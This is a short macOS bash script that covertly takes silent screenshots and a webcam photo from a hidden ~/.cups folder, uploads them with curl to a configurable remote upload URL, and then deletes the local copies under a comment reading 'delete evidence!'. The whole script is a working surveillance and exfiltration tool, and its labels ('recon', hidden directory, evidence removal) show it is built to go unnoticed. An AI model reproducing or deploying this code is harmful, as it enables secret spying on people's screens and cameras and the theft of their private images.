#!/bin/bash

UPLOADER=<insert the url to your upload.php, or whatever script you want to post images to here>
HOSTNAME=`hostname`
USERNAME=`whoami`

# recon
cd /Users/$USERNAME/.cups
DATE=`date +%d%m%y_%H%M`
STAMP=`echo $HOSTNAME-$DATE`
/usr/sbin/screencapture -x screen-$STAMP.jpg screen2-$STAMP.jpg screen3-$STAMP.jpg screen4-$STAMP.jpg
/Users/$USERNAME/.cups/imagesnap /Users/$USERNAME/.cups/camera-$STAMP.jpg 2>&1 > /dev/null
/usr/bin/curl -s -F "file=camera-$STAMP.jpg" -F "file=@camera-$STAMP.jpg" $UPLOADER 2>&1 > /dev/null
for screenshot in `ls /Users/$USERNAME/.cups/screen*.jpg`
	do
		/usr/bin/curl -s -F "$screenshot" -F "$screenshot" $UPLOADER 2>&1 > /dev/null
	done
# delete evidence!
rm camera-$STAMP.jpg screen-$STAMP.jpg
